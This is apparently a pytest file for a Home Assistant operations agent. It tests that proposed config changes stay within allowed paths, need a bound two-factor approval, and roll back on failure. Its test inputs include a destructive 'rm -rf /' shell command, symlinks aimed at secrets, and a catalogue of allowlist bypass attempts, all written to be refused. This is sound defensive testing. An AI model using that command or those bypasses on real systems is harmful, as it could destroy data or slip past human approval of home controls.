"""Config changes as git proposals, against real git repositories in a temp dir.

Proposals are plumbing-only commits on refs/ops/proposals/<id>; applying or
reverting needs the panel request plus the phone tap, re-checks the binding,
refuses stale or dirty trees, restores exactly on any failure, never restarts
Core and never pushes a proposal ref.
"""

import hashlib
import json
import os
import subprocess
from collections.abc import Iterator
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from opsd import changes as ch
from opsd.approvals import APPROVAL_TTL, Approvals
from opsd.changepaths import allowed_path
from opsd.changes import ChangeManager, ChangeRefused, FileChange, LiveFiles, build_proposal, check_content
from opsd.channels import Message
from opsd.gitops import REF_PREFIX, Repo
from opsd.guard import draft_problem
from opsd.store import Store
from tests.conftest import FACTS as FACTS_PATH
from tests.conftest import SAMPLE_PROFILE, make_options
from tests.test_full_chat import h  # noqa: F401
from tests.test_panel import local_ingress, p  # noqa: F401

ADMIN = "u-admin"
FRIDGE = "automations/kitchen/fridge.yaml"
ALERT = "alerts/fridge.yaml"
TEMPLATE = "templates/status.yaml"
FILES = {
    FACTS_PATH: "# House facts\n\n- The fridge is set to 5 C.\n",
    FRIDGE: "alias: Fridge check\ntrigger:\n  - platform: numeric_state\n    entity_id: sensor.fridge\n    above: 40\n"
    "action:\n  - service: notify.mobile_app_admin_phone\n    data:\n      message: Fridge warm\n",
    ALERT: "alert:\n  fridge_alert:\n    name: Fridge\n    entity_id: binary_sensor.fridge_warm\n"
    "    notifiers:\n      - critical_alerts\n",
    TEMPLATE: '- sensor:\n    - name: Attention\n      state: "{{ 1 }}"\n',
    "configuration.yaml": "homeassistant:\n  name: Home\n",
    "automations/locks/auto_lock.yaml": "alias: Lock\naction:\n  - service: lock.lock\n",
}


def git(repo: Path, *args: str) -> str:
    done = subprocess.run(
        ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false",
         *args], capture_output=True, text=True, check=True,
        env={"PATH": os.environ["PATH"], "HOME": str(repo), "GIT_CONFIG_GLOBAL": "/dev/null"},
    )  # fmt: skip
    return done.stdout


@dataclass
class World:
    root: Path
    repo_path: Path
    origin: Path
    now: datetime = datetime(2026, 1, 28, 12, 0, tzinfo=UTC)
    sent: list[Message] = field(default_factory=list)
    checks: list[str] = field(default_factory=list)
    reloads: list[tuple[str, str]] = field(default_factory=list)
    check_result: tuple[bool, str] = (True, "")
    reload_fails: int = 0
    mode: str = "act"

    def __post_init__(self) -> None:
        self.store = Store.open(self.root / "ops.db")
        git = SAMPLE_PROFILE.git
        self.repo = Repo(self.repo_path, self.root / "key", self.root / "known_hosts",
                         author=(git.author_name, git.author_email))  # fmt: skip
        self.approvals = Approvals(self.store, clock=lambda: self.now)
        self.build()

    def build(self) -> None:
        self.options = make_options(agent__mode=self.mode, limits__git_push=True)

        async def check() -> tuple[bool, str]:
            self.checks.append("check")
            return self.check_result

        async def reload(domain: str, service: str) -> None:
            self.reloads.append((domain, service))
            if self.reload_fails:
                self.reload_fails -= 1
                raise RuntimeError("500: Invalid config for automation")

        async def send(message: Message) -> str:
            self.sent.append(message)
            return "sent"

        self.manager = ChangeManager(store=self.store, repo=self.repo, approvals=self.approvals, options=self.options,
                                     live=LiveFiles(self.repo_path), check_config=check, reload=reload, send=send,
                                     clock=lambda: self.now)  # fmt: skip

    def propose(self, files: dict[str, str], *, kind: str = "change", subject: str = "fix(alerts): tune the fridge",
                **kw: Any) -> dict[str, Any]:  # fmt: skip
        return build_proposal(self.store, self.repo, self.options, kind=kind,
                              files=[FileChange(path, t.encode()) for path, t in files.items()], subject=subject,
                              why="the alert is too eager", effect="alerts later", requested_by="admin-chat:u-admin",
                              day=self.now.date().isoformat(), now=self.now, entities=REGISTRY, **kw)  # fmt: skip

    async def approve(self, change_id: int, action: str = "apply", user: str = ADMIN) -> str:
        row = self.store.change(change_id)
        shown = [f["new_sha256"] for f in row["files"]] if row else []
        found = await self.manager.request(change_id, action, user, shown)
        return str(found["id"])

    async def run(self, change_id: int, action: str = "apply") -> ch.Outcome:
        approval = await self.approve(change_id, action)
        assert await self.manager.confirm(approval, ADMIN) == "approved"
        return await self.manager.execute(approval)

    def read(self, path: str) -> str:
        return (self.repo_path / path).read_text()

    def head(self) -> str:
        return git(self.repo_path, "rev-parse", "HEAD").strip()


@pytest.fixture
def w(tmp_path: Path) -> Iterator[World]:
    origin = tmp_path / "origin.git"
    repo = tmp_path / "config"
    git(tmp_path, "init", "-q", "--bare", "-b", "main", str(origin))
    git(tmp_path, "init", "-q", "-b", "main", str(repo))
    for path, text in FILES.items():
        (repo / path).parent.mkdir(parents=True, exist_ok=True)
        (repo / path).write_text(text)
    (repo / ".gitignore").write_text("secrets.yaml\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "chore: initial")
    git(repo, "remote", "add", "origin", str(origin))
    git(repo, "push", "-q", "origin", "main")
    world = World(tmp_path, repo, origin)
    yield world
    world.store.close()


REGISTRY = frozenset({"light.kitchen", "light.porch", "fan.bedroom", "input_boolean.guest_mode", "sensor.fridge",
                      "media_player.kitchen",
                      "lock.front_door", "cover.garage_door", "cover.workshop", "switch.heater",
                      "scene.movie", "script.unlock_all", "automation.unlock"})  # fmt: skip
NEW_ALERT = FILES[ALERT].replace("name: Fridge", "name: Fridge (warm for 30 min)")
NEW_FRIDGE = FILES[FRIDGE].replace("above: 40", "above: 42")


# --------------------------------------------------------- what may change


@pytest.mark.parametrize(
    "path",
    [FACTS_PATH, "automations/a.yaml", "automations/kitchen/fridge.yaml", "automations/a/b/c/d/e.yaml",
     "alerts/x.yaml", "templates/status.yaml"],
)  # fmt: skip
def test_allowed_paths(path: str) -> None:
    assert allowed_path(path, SAMPLE_PROFILE.proposal_rules)


@pytest.mark.parametrize(
    "path",
    ["configuration.yaml", "secrets.yaml", "automations/secrets.yaml", "custom_components/acme_solar/light.py",
     "custom_templates/x.jinja", "addons/ha-ops-agent/config.yaml", ".storage/core.config", "RUNBOOK.md",
     "notes.md", ".gitignore", ".git/config", "docs/other.md", "automations/../configuration.yaml",
     "automations/./a.yaml", "/automations/a.yaml", "automations//a.yaml", "alerts/sub/x.yaml",
     "templates/x.yml", "automations/A.yaml", "automations/.hidden.yaml", "automations/a.yaml ",
     "automations/a/b/c/d/e/f.yaml", "blueprints/x.yaml", "alerts/x.yaml/../../secrets.yaml"],
)  # fmt: skip
def test_everything_else_is_refused(path: str) -> None:
    assert not allowed_path(path, SAMPLE_PROFILE.proposal_rules)
    assert draft_problem(f"/run/ops-drafts/{path}", "x") is not None


def test_guard_write_rules(tmp_path: Path) -> None:
    drafts = tmp_path / "drafts"
    (drafts / "alerts").mkdir(parents=True)
    root = __import__("pathlib").PurePosixPath(str(drafts))
    rules = SAMPLE_PROFILE.proposal_rules
    assert draft_problem(f"{drafts}/alerts/x.yaml", "a: 1", root, rules) is None
    assert draft_problem(f"{drafts}/alerts/x.yaml", "a" * (64 * 1024 + 1), root, rules) is not None
    assert draft_problem("/run/ops-claude/config/alerts/x.yaml", "a", root, rules) is not None
    assert draft_problem("alerts/x.yaml", "a", root, rules) is not None  # relative: not below the drafts dir
    (drafts / "templates").symlink_to(tmp_path)  # a link out of the drafts dir
    assert draft_problem(f"{drafts}/templates/x.yaml", "a", root, rules) is not None
    # Without the daemon's rules in the environment (git off), the hook allows no draft at all.
    assert "git proposals are off" in str(draft_problem(f"{drafts}/alerts/x.yaml", "a: 1", root))


def test_drafts_are_read_without_following_links(tmp_path: Path) -> None:
    drafts = tmp_path / "drafts"
    (drafts / "alerts").mkdir(parents=True)
    (drafts / "alerts" / "ok.yaml").write_text("a: 1\n")
    assert ch.read_draft(drafts, "alerts/ok.yaml", owner=None) == b"a: 1\n"
    assert ch.read_draft(drafts, "alerts/ok.yaml", owner=os.getuid()) == b"a: 1\n"
    with pytest.raises(ChangeRefused, match="not written by the agent"):
        ch.read_draft(drafts, "alerts/ok.yaml", owner=os.getuid() + 1)
    secret = tmp_path / "secrets.yaml"
    secret.write_text("password: hunter2\n")
    (drafts / "alerts" / "link.yaml").symlink_to(secret)
    with pytest.raises(ChangeRefused):
        ch.read_draft(drafts, "alerts/link.yaml", owner=None)
    os.link(secret, drafts / "alerts" / "hard.yaml")
    with pytest.raises(ChangeRefused, match="not a plain file"):
        ch.read_draft(drafts, "alerts/hard.yaml", owner=None)
    (drafts / "templates").symlink_to(tmp_path)
    (tmp_path / "x.yaml").write_text("a: 1\n")
    with pytest.raises(ChangeRefused):
        ch.read_draft(drafts, "templates/x.yaml", owner=None)
    os.mkfifo(drafts / "alerts" / "fifo.yaml")
    with pytest.raises(ChangeRefused, match="not a plain file"):
        ch.read_draft(drafts, "alerts/fifo.yaml", owner=None)
    (drafts / "alerts" / "big.yaml").write_bytes(b"a" * (64 * 1024 + 1))
    with pytest.raises(ChangeRefused, match="larger than"):
        ch.read_draft(drafts, "alerts/big.yaml", owner=None)
    ch.drop_draft(drafts, "alerts/ok.yaml")
    assert not (drafts / "alerts" / "ok.yaml").exists() and secret.exists()


ADMIN_NOTIFY = "mobile_app_admin_phone"


def check(path: str, text: str, old: str | None = None) -> dict[str, Any]:
    return check_content(path, old.encode() if old is not None else None, text.encode(), notify_service=ADMIN_NOTIFY,
                         entities=REGISTRY)  # fmt: skip


def automation(actions: str) -> str:
    return f"alias: Test\ntrigger:\n  - platform: state\n    entity_id: sensor.fridge\naction:\n{actions}"


@pytest.mark.parametrize(
    ("actions", "reason"),
    [
        # Line-rule pre-filter.
        ("  - service: light.turn_on\n    data:\n      password: !secret wifi\n", "!secret"),
        ("  - service: light.turn_on\n    data: !include other.yaml\n", "!include"),
        ("  - service: light.turn_on\n    data:\n      key: !env_var HOME\n", "!env_var"),
        # Templated or escaped action names.
        (
            "  - action: \"{{ 'lo' ~ 'ck.unlock' }}\"\n    target:\n      entity_id: lock.front_door\n",
            "literal|locks",
        ),
        ('  - action: "lo\\x63k.unlock"\n', "lock.unlock is not an action"),
        ("  - action: >-\n      lock.unlock\n", "lock.unlock is not an action|locks"),
        ("  - action:\n      lock.unlock\n", "lock.unlock is not an action|locks"),
        # Anchors, aliases and merge keys.
        ("  - &a\n    action: light.turn_on\n  - *a\n", "anchors and aliases"),
        ("  - <<: {action: light.turn_on}\n", "merge keys"),
        # Actions outside the allowlist, however addressed.
        ("  - action: cover.open_cover\n    target:\n      entity_id: cover.workshop\n", "cover.open_cover is not"),
        ("  - action: switch.turn_on\n    target:\n      entity_id: switch.heater\n", "switch.turn_on is not"),
        ("  - action: scene.turn_on\n    target:\n      entity_id: scene.movie\n", "scene.turn_on is not"),
        ("  - action: script.unlock_all\n", "script.unlock_all is not"),
        ("  - action: automation.trigger\n    target:\n      entity_id: automation.unlock\n", "automation.trigger is"),
        (
            "  - action: homeassistant.turn_on\n    target:\n      entity_id: lock.front_door\n",
            "homeassistant.turn_on is not|locks",
        ),
        ("  - action: hassio.addon_stop\n", "hassio"),
        ("  - action: button.press\n", "button.press is not"),
        ("  - action: notify.mobile_app_someone_else\n", "notify"),
        ("  - action: notify.send_message\n", "notify.send_message is not|only notify"),
        # Step types that are not service calls.
        ("  - scene: scene.movie\n", "scene"),
        ("  - event: unlock_now\n", "event"),
        ("  - device_id: abc123\n    domain: light\n    type: turn_on\n", "device_id"),
        ("  - stop_everything: true\n", "unknown action step"),
        # Targets that are not explicit, existing entities of the action's domain.
        ("  - action: light.turn_on\n    target:\n      entity_id: all\n", "literal"),
        ("  - action: light.turn_on\n    target:\n      area_id: garage\n", "area_id|explicit entity ids"),
        ("  - action: light.turn_on\n    target:\n      device_id: abc\n", "device_id|explicit entity ids"),
        ("  - action: light.turn_on\n    target:\n      floor_id: ground\n", "floor_id|explicit entity ids"),
        ("  - action: light.turn_on\n    target:\n      label_id: outside\n", "label_id|explicit entity ids"),
        ("  - action: light.turn_on\n    entity_id: \"{{ 'light.' ~ x }}\"\n", "literal"),
        ("  - action: light.turn_on\n    data:\n      entity_id: lock.front_door\n", "locks|another domain"),
        ("  - action: light.turn_on\n    target:\n      entity_id: light.not_there\n", "not in the entity registry"),
        ("  - action: fan.turn_on\n    target:\n      entity_id: light.kitchen\n", "another domain"),
        ("  - action: light.turn_on\n    data_template:\n      entity_id: light.kitchen\n", "data_template"),
        # Hidden in control flow.
        (
            "  - choose:\n      - conditions: []\n        sequence:\n          - action: cover.open_cover\n",
            "cover.open_cover is not",
        ),
        ("  - if: []\n    then:\n      - delay: 1\n    else:\n      - event: x\n", "event"),
        ("  - repeat:\n      count: 2\n      sequence:\n        - action: switch.turn_on\n", "switch.turn_on"),
        ("  - parallel:\n      - action: climate.set_temperature\n      - action: lock.lock\n", "lock.lock|locks"),
    ],
)
def test_bypasses_are_refused(actions: str, reason: str) -> None:
    with pytest.raises(ChangeRefused, match=reason):
        check(FRIDGE, automation(actions), FILES[FRIDGE])


def test_garage_covers_without_garage_in_the_name_and_blueprints_are_refused() -> None:
    with pytest.raises(ChangeRefused, match=r"cover\.close_cover is not"):
        check(FRIDGE, automation("  - action: cover.close_cover\n    target:\n      entity_id: cover.workshop\n"))
    with pytest.raises(ChangeRefused, match="use_blueprint"):
        check(FRIDGE, "use_blueprint:\n  path: x.yaml\n  input:\n    a: light.kitchen\n")
    with pytest.raises(ChangeRefused, match="unknown automation keys"):
        check(FRIDGE, "alias: x\nsomething: 1\n")
    # A template lock entity, a package with other integrations, and other alert notifiers.
    with pytest.raises(ChangeRefused, match="template blocks may define"):
        check(TEMPLATE, "- lock:\n    - name: L\n      lock: []\n      unlock: []\n")
    with pytest.raises(ChangeRefused, match="event is not allowed"):
        check(TEMPLATE, "- button:\n    - name: B\n      press:\n        - event: x_y\n")
    with pytest.raises(ChangeRefused, match="unknown action step"):
        check(TEMPLATE, "- button:\n    - name: B\n      press:\n        - set_conversation_response: hi\n")
    with pytest.raises(ChangeRefused, match="unknown action step"):
        check(FRIDGE, automation("  - wait: 5\n"))
    with pytest.raises(ChangeRefused, match="shell_command"):
        check(ALERT, FILES[ALERT] + "shell_command:\n  x: rm -rf /\n")
    with pytest.raises(ChangeRefused, match="alert: and template: only"):
        check(ALERT, FILES[ALERT] + "input_boolean:\n  x: {}\n")
    with pytest.raises(ChangeRefused, match="alert: and template: only"):
        check(ALERT, FILES[ALERT] + "script:\n  s:\n    sequence: []\n")
    with pytest.raises(ChangeRefused, match="notifiers"):
        check(ALERT, FILES[ALERT].replace("critical_alerts", "family"))


def test_registry_unavailable_refuses_targets() -> None:
    text = automation("  - action: light.turn_on\n    target:\n      entity_id: light.kitchen\n")
    with pytest.raises(ChangeRefused, match="registry is unavailable"):
        check_content(FRIDGE, None, text.encode(), notify_service=ADMIN_NOTIFY, entities=None)


def test_allowed_happy_paths_and_their_summary() -> None:
    light = automation(
        "  - action: light.turn_on\n    target:\n      entity_id:\n        - light.kitchen\n        - light.porch\n"
        '    data:\n      brightness_pct: "{{ 50 }}"\n'
        "  - choose:\n      - conditions:\n          - condition: state\n            entity_id: sensor.fridge\n"
        "            state: 'on'\n        sequence:\n          - action: fan.turn_off\n"
        "            entity_id: fan.bedroom\n    default:\n      - action: notify.mobile_app_admin_phone\n"
        "        data:\n          message: \"Fridge {{ states('sensor.fridge') }} F\"\n"
    )
    summary = check(FRIDGE, light, FILES[FRIDGE])
    assert summary["actions_added"] == ["fan.turn_off", "light.turn_on"]
    assert summary["entities_added"] == ["fan.bedroom", "light.kitchen", "light.porch"]
    assert summary["actions_removed"] == [] and summary["added"] > 0
    alert = FILES[ALERT].replace("- critical_alerts", "- critical_alerts\n      - mobile_app_admin_phone")
    summary = check(ALERT, alert, FILES[ALERT])
    assert summary["actions_added"] == ["notify.mobile_app_admin_phone"]
    check(TEMPLATE, FILES[TEMPLATE].replace("{{ 1 }}", "{{ 2 }}"), FILES[TEMPLATE])
    check(TEMPLATE, "- button:\n    - name: Guest\n      press:\n        - action: input_boolean.toggle\n"
                    "          target:\n            entity_id: input_boolean.guest_mode\n")  # fmt: skip
    check(FACTS_PATH, FILES[FACTS_PATH] + "- More.\n", FILES[FACTS_PATH])


def test_content_hygiene() -> None:
    with pytest.raises(ChangeRefused, match="does not parse"):
        check(FRIDGE, "a: [1, 2\n")
    with pytest.raises(ChangeRefused, match="control characters"):
        check(FRIDGE, "a: 1\x1b[2J\n")
    with pytest.raises(ChangeRefused, match="UTF-8"):
        check_content(FRIDGE, None, b"a: \xff\n", notify_service="x", entities=REGISTRY)
    # An existing lock automation can no longer be edited by the agent at all (fail closed).
    old = FILES["automations/locks/auto_lock.yaml"]
    with pytest.raises(ChangeRefused):
        check("automations/locks/auto_lock.yaml", old.replace("alias: Lock", "alias: Lock it"), old)


# ------------------------------------------------------------- proposing


def test_proposing_never_touches_the_working_tree_or_index(w: World) -> None:
    index = (w.repo_path / ".git" / "index").read_bytes()
    head = w.head()
    found = w.propose({ALERT: NEW_ALERT, "automations/new_dir/new.yaml": "alias: New\naction: []\n"})
    assert found["state"] == "open" and found["ref"] == f"{REF_PREFIX}{found['id']}"
    assert (w.repo_path / ".git" / "index").read_bytes() == index and w.head() == head
    assert git(w.repo_path, "status", "--porcelain", "--untracked-files=all") == ""
    assert w.read(ALERT) == FILES[ALERT] and not (w.repo_path / "automations" / "new_dir").exists()
    commit = git(w.repo_path, "rev-parse", found["ref"]).strip()
    assert commit == found["commit_sha"] and git(w.repo_path, "rev-parse", f"{commit}^").strip() == head
    assert git(w.repo_path, "show", "-s", "--format=%an <%ae>|%s", commit).strip() == (
        "Alex Example <alex@example.com>|fix(alerts): tune the fridge"
    )
    assert git(w.repo_path, "show", f"{commit}:{ALERT}") == NEW_ALERT
    assert "+    name: Fridge (warm for 30 min)" in found["diff"] and "b/automations/new_dir/new.yaml" in found["diff"]
    [row] = [f for f in found["files"] if f["path"] == ALERT]
    assert row["new_sha256"] == hashlib.sha256(NEW_ALERT.encode()).hexdigest()
    # The ref is never pushed.
    assert "refs/ops" not in git(w.origin, "for-each-ref")


def test_proposal_limits_and_refusals(w: World) -> None:
    with pytest.raises(ChangeRefused, match="conventional commit"):
        w.propose({ALERT: NEW_ALERT}, subject="Update the alert")
    with pytest.raises(ChangeRefused, match="at most 3 files"):
        w.propose({f"alerts/a{i}.yaml": "a: 1\n" for i in range(4)})
    with pytest.raises(ChangeRefused, match="cannot be changed"):
        w.propose({"configuration.yaml": "homeassistant: {}\n"})
    with pytest.raises(ChangeRefused, match="unchanged"):
        w.propose({ALERT: FILES[ALERT]})
    with pytest.raises(ChangeRefused, match=r"changes docs/facts\.md only"):
        w.propose({ALERT: NEW_ALERT}, kind="facts")
    for i in range(ch.MAX_OPEN):
        w.propose({f"alerts/n{i}.yaml": f"alert:\n  n{i}:\n    name: N\n"})
    with pytest.raises(ChangeRefused, match="already waiting"):
        w.propose({"alerts/n9.yaml": "alert:\n  n9:\n    name: N\n"})


def test_symlinks_and_submodules_in_git_are_refused(w: World) -> None:
    os.symlink("fridge.yaml", w.repo_path / "alerts" / "link.yaml")
    git(w.repo_path, "add", "-A")
    git(w.repo_path, "commit", "-q", "-m", "chore: link")
    with pytest.raises(ChangeRefused, match="not a regular file"):
        w.propose({"alerts/link.yaml": "a: 1\n"})


def test_daily_limit(w: World) -> None:
    for i in range(ch.MAX_PER_DAY):
        found = w.propose({f"alerts/d{i}.yaml": f"alert:\n  d{i}:\n    name: D\n"})
        w.manager.reject(found["id"], ADMIN)
    with pytest.raises(ChangeRefused, match="today's limit"):
        w.propose({"alerts/d9.yaml": "alert:\n  d9:\n    name: D\n"})


# ---------------------------------------------------------------- applying


async def test_apply_writes_checks_reloads_commits_and_pushes(w: World) -> None:
    os.chmod(w.repo_path / ALERT, 0o640)
    found = w.propose({FRIDGE: NEW_FRIDGE, ALERT: NEW_ALERT})
    outcome = await w.run(found["id"])
    assert outcome.state == "applied", outcome.detail
    assert w.read(FRIDGE) == NEW_FRIDGE and w.read(ALERT) == NEW_ALERT
    assert (w.repo_path / ALERT).stat().st_mode & 0o777 == 0o640  # owner and mode kept
    assert w.checks == ["check"] and w.reloads == [("automation", "reload")]  # alerts: no reload, no restart
    row = w.store.change(found["id"])
    assert row is not None and row["state"] == "applied" and "next Core restart" in row["detail"]
    assert git(w.repo_path, "log", "-1", "--format=%s").strip() == "fix(alerts): tune the fridge"
    assert git(w.repo_path, "show", "--name-only", "--format=", "HEAD").split() == [ALERT, FRIDGE]
    assert git(w.repo_path, "status", "--porcelain") == ""
    remote = git(w.origin, "for-each-ref", "--format=%(refname)").split()
    assert remote == ["refs/heads/main"] and git(w.origin, "rev-parse", "main").strip() == w.head()
    assert git(w.repo_path, "for-each-ref", REF_PREFIX) == ""  # deleted after apply


async def test_two_factors_binding_replay_and_expiry(w: World) -> None:
    found = w.propose({ALERT: NEW_ALERT})
    approval = await w.approve(found["id"])
    assert w.store.approval(approval)["state"] == "pending"  # type: ignore[index]
    # The panel request alone does nothing; another user's tap is refused.
    assert await w.manager.confirm(approval, "u-household") == "refused"
    assert (await w.manager.execute(approval)).state == "refused" and w.read(ALERT) == FILES[ALERT]
    assert await w.manager.confirm(approval, ADMIN) == "approved"
    assert await w.manager.confirm(approval, ADMIN) == "refused"  # replayed tap
    assert (await w.manager.execute(approval)).state == "applied"
    assert (await w.manager.execute(approval)).state == "refused"  # used once
    # An update approval path never accepts a change approval.
    assert w.approvals.confirm(approval, user=ADMIN, current=None) == "refused"
    # Expiry.
    other = w.propose({TEMPLATE: FILES[TEMPLATE].replace("{{ 1 }}", "{{ 2 }}")})
    late = await w.approve(other["id"])
    w.now += APPROVAL_TTL + timedelta(minutes=1)
    assert await w.manager.confirm(late, ADMIN) == "expired"


@pytest.mark.parametrize("tamper", ["row_hash", "ref", "approval_hash"])
async def test_tampering_voids_the_approval(w: World, tamper: str) -> None:
    found = w.propose({ALERT: NEW_ALERT})
    approval = await w.approve(found["id"])
    if tamper == "row_hash":
        files = [f | {"new_sha256": "0" * 64} for f in found["files"]]
        with w.store._tx() as conn:
            conn.execute("UPDATE approvals SET payload = json_set(payload, '$.files', json(?)) WHERE kind = 'change'"
                         " AND id = ?", (json.dumps(files), str(found["id"])))  # fmt: skip
    elif tamper == "ref":
        other = w.propose({TEMPLATE: FILES[TEMPLATE].replace("{{ 1 }}", "{{ 3 }}")})
        git(w.repo_path, "update-ref", found["ref"], other["commit_sha"])
    else:
        with w.store._tx() as conn:
            conn.execute("UPDATE approvals SET plan_hash = ? WHERE id = ?", ("f" * 64, approval))
    assert await w.manager.confirm(approval, ADMIN) == "void"
    assert w.read(ALERT) == FILES[ALERT]


async def test_a_binding_change_after_the_tap_stops_the_apply(w: World) -> None:
    found = w.propose({ALERT: NEW_ALERT})
    approval = await w.approve(found["id"])
    assert await w.manager.confirm(approval, ADMIN) == "approved"
    files = [f | {"old_sha256": "0" * 64} for f in found["files"]]
    with w.store._tx() as conn:
        conn.execute("UPDATE approvals SET payload = json_set(payload, '$.files', json(?)) WHERE kind = 'change'"
                         " AND id = ?", (json.dumps(files), str(found["id"])))  # fmt: skip
    outcome = await w.manager.execute(approval)
    assert outcome.state == "refused" and w.read(ALERT) == FILES[ALERT]
    assert w.store.approval(approval)["state"] == "void"  # type: ignore[index]


async def test_stale_and_dirty_trees_are_refused(w: World) -> None:
    found = w.propose({ALERT: NEW_ALERT})
    approval = await w.approve(found["id"])
    assert await w.manager.confirm(approval, ADMIN) == "approved"
    (w.repo_path / ALERT).write_text(FILES[ALERT] + "# edited by hand\n")
    git(w.repo_path, "commit", "-q", "-am", "fix: hand edit")
    outcome = await w.manager.execute(approval)
    assert outcome.state == "refused" and "stale" in outcome.detail and "re-propose" in outcome.detail
    row = w.store.change(found["id"])
    assert row is not None and row["state"] == "stale" and git(w.repo_path, "for-each-ref", REF_PREFIX) == ""
    # A dirty tree: nothing is written, the admin can ask again later.
    second = w.propose({TEMPLATE: FILES[TEMPLATE].replace("{{ 1 }}", "{{ 4 }}")})
    (w.repo_path / "configuration.yaml").write_text("homeassistant:\n  name: Changed\n")
    approval = await w.approve(second["id"])
    assert await w.manager.confirm(approval, ADMIN) == "approved"
    outcome = await w.manager.execute(approval)
    assert outcome.state == "refused" and "uncommitted changes" in outcome.detail
    assert w.read(TEMPLATE) == FILES[TEMPLATE] and w.store.change(second["id"])["state"] == "open"  # type: ignore[index]


async def test_a_failed_config_check_restores_exactly(w: World) -> None:
    w.check_result = (False, "Invalid config for automation: extra keys")
    found = w.propose({FRIDGE: NEW_FRIDGE, "automations/new_dir/new.yaml": "alias: New\naction: []\n"})
    head = w.head()
    outcome = await w.run(found["id"])
    assert outcome.state == "failed" and "config check failed" in outcome.detail
    assert w.read(FRIDGE) == FILES[FRIDGE] and not (w.repo_path / "automations" / "new_dir").exists()
    assert w.head() == head and git(w.repo_path, "status", "--porcelain", "--untracked-files=all") == ""
    assert w.reloads == [] and w.sent and "not applied" in w.sent[-1].title


async def test_a_failed_reload_restores_reloads_again_and_escalates(w: World) -> None:
    w.reload_fails = 1
    found = w.propose({FRIDGE: NEW_FRIDGE})
    head = w.head()
    outcome = await w.run(found["id"])
    assert (
        outcome.state == "failed"
        and "reload failed" in outcome.detail
        and "restored config was reloaded" in (outcome.detail)
    )
    assert w.read(FRIDGE) == FILES[FRIDGE] and w.head() == head
    assert w.reloads == [("automation", "reload"), ("automation", "reload")]
    assert w.sent[-1].urgent and "rolled back" in w.sent[-1].title


async def test_observe_mode_applies_only_the_house_facts(w: World) -> None:
    w.mode = "observe"
    w.build()
    ha = w.propose({ALERT: NEW_ALERT})
    with pytest.raises(Exception, match="observe mode"):
        await w.approve(ha["id"])
    facts = ch.propose_fact(w.store, w.repo, w.options, fact="The garden speaker is unplugged in winter.", why="noted",
                            requested_by="panel:u-admin", day="2026-01-28", now=w.now)  # fmt: skip
    outcome = await w.run(facts["id"])
    assert outcome.state == "applied" and "- The garden speaker is unplugged in winter. (noted 2026-01-28)" in w.read(
        FACTS_PATH
    )
    assert w.checks == [] and w.reloads == []  # documentation: no config check, no reload


async def test_revert_writes_back_what_the_change_replaced(w: World) -> None:
    found = w.propose({ALERT: NEW_ALERT, "automations/new_dir/new.yaml": "alias: New\naction: []\n"})
    assert (await w.run(found["id"])).state == "applied"
    with pytest.raises(Exception, match="cannot be applied"):
        await w.approve(found["id"])
    outcome = await w.run(found["id"], "revert")
    assert outcome.state == "reverted", outcome.detail
    assert w.read(ALERT) == FILES[ALERT] and not (w.repo_path / "automations" / "new_dir" / "new.yaml").exists()
    assert (
        git(w.repo_path, "log", "-1", "--format=%s").strip() == f"chore(ops-agent): revert config change {found['id']}"
    )
    assert git(w.origin, "for-each-ref", "--format=%(refname)").split() == ["refs/heads/main"]


async def test_restart_mid_apply_is_recovered(w: World) -> None:
    found = w.propose({ALERT: NEW_ALERT})
    assert w.store.move_change(found["id"], expect=("open",), to="applying", now=w.now)
    (w.repo_path / ALERT).write_text(NEW_ALERT)  # written, then the daemon died before the commit
    assert w.manager.recover() == 1
    row = w.store.change(found["id"])
    assert row is not None and row["state"] == "failed" and w.read(ALERT) == FILES[ALERT]


def test_reject_and_expiry_delete_the_ref(w: World) -> None:
    found = w.propose({ALERT: NEW_ALERT})
    assert w.manager.reject(found["id"], ADMIN) and git(w.repo_path, "for-each-ref", REF_PREFIX) == ""
    other = w.propose({TEMPLATE: FILES[TEMPLATE].replace("{{ 1 }}", "{{ 5 }}")})
    w.now += ch.PROPOSAL_TTL + timedelta(minutes=1)
    assert w.manager.expire() == 1 and w.store.change(other["id"])["state"] == "expired"  # type: ignore[index]
    assert git(w.repo_path, "for-each-ref", REF_PREFIX) == ""


def test_with_fact_appends_to_its_own_section() -> None:
    doc = ch.with_fact("# House facts\n\n- a\n", "b", "2026-01-28")
    assert doc.endswith(f"{ch.FACTS_SECTION}\n\n- b (noted 2026-01-28)\n")
    doc = ch.with_fact(doc + "\n## Later\n\n- z\n", "c", "2026-01-29")
    assert "- b (noted 2026-01-28)\n- c (noted 2026-01-29)\n\n## Later" in doc
    with pytest.raises(ChangeRefused):
        ch.clean_fact("  ### ")


# ------------------------------------------------- capabilities and panel


def repo_from(paths: Any) -> None:
    """Make the harness's config directory a git repository on main."""
    ha = paths.ha_config
    (ha / "alerts").mkdir(exist_ok=True)
    (ha / ALERT).write_text(FILES[ALERT])
    (ha / "docs").mkdir(exist_ok=True)
    (ha / FACTS_PATH).write_text(FILES[FACTS_PATH])
    (ha / ".gitignore").write_text("secrets.yaml\n")
    git(ha, "init", "-q", "-b", "main")
    git(ha, "add", "-A")
    git(ha, "commit", "-q", "-m", "chore: initial")


async def test_chat_proposes_from_a_draft_and_cannot_apply(h: Any) -> None:  # noqa: F811
    from tests.test_full_chat import ask, daemon

    repo_from(h.paths)
    d = daemon(h)
    original = d.runner.run_claude

    async def writes_draft(cfg: Any, prompt: str, **kwargs: Any) -> Any:
        # What the AI's Write tool does: the run's drafts directory exists and is empty.
        assert cfg.tools.endswith(",Write")
        # Empty but for the allowlisted directories (no draft ever needs a mkdir).
        assert sorted(d.name for d in h.paths.drafts_dir.iterdir()) == ["alerts", "automations", "docs", "templates"]
        assert not any(f.is_file() for f in h.paths.drafts_dir.rglob("*"))
        (h.paths.drafts_dir / ALERT).write_text(NEW_ALERT)
        return await original(cfg, prompt, **kwargs)

    d.runner.run_claude = writes_draft
    h.in_run_requests = [
        {"verb": "propose-change", "args": {"paths": ALERT, "subject": "fix(alerts): name the fridge alert",
                                             "why": "clearer push", "effect": "the alert title changes"}},
        {"verb": "propose-change", "args": {"paths": "configuration.yaml", "subject": "fix: x", "why": "y"}},
        {"verb": "change-apply", "args": {}},
        {"verb": "propose-fact", "args": {"text": "The shed light is on a timer.", "why": "the admin said so"}},
    ]  # fmt: skip
